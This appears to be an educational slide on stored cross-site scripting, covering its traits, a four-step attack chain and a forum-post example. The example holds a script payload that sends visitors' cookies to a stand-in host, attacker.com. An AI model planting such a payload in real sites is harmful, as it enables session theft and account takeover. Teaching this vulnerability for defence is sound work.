Stored XSS - The Persistent Danger

Malicious Scripts Permanently Stored on the Target Server

Key Characteristics

  • Persistence: Payload is saved on the server (database, file system).
  • Widespread Impact: Affects all users who view the compromised content.
  • No Direct Interaction: Victims don't need to click a malicious link; simply visiting the page triggers the script.
  • High Severity: Often leads to more significant damage due to its persistent nature.

Concrete Example: Forum Post

An attacker posts a forum message containing:

<script>window.location='http://attacker.com/log.php?c='+document.cookie;</script>

This script is stored in the forum's database. Every user who views this post will have their cookie sent to the attacker's server.

Stored XSS Attack Chain

1. Attacker injects script

Via comment, forum, profile field

2. Script stored on server

Persists in database or file system

3. Victim requests affected page

Server delivers stored script

4. Browser executes script

All users viewing the content are affected

Key Takeaway

Stored XSS is a persistent vulnerability where malicious scripts are saved on the server, impacting all users who access the compromised content without direct interaction.
